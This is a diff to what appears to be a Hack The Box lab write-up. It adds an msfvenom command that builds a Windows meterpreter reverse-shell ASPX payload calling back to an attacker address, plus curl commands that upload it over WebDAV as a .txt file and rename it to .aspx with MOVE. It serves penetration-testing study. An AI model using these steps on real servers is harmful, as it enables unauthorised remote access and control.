@@ -260,7 +260,15 @@ curl -X MOVE -H 'Destination:http://10.10.10.15/revsh.aspx' http://10.10.10.15/r
 ---
 
 ## MSF Venom
+Generate the shell
 ```shell
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=443 -f aspx > shell.aspx     
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=443 -f aspx > shell.aspx
 ```
-![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/3d625576-c3ee-4c8d-8ae9-44895439a223)
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/c3c4c830-1a83-4773-9a6a-04f9665547a5)
+
+
+Upload the shell with `.txt` extension and then use the move http method to rename the shell with the `.aspx` extension.
+```shell
+curl -X PUT http://10.10.10.15/shell.txt -d @shell.aspx
+curl -X MOVE -H 'Destination: http://10.10.10.15/shell.aspx' http://10.10.10.15/shell.txt
+```
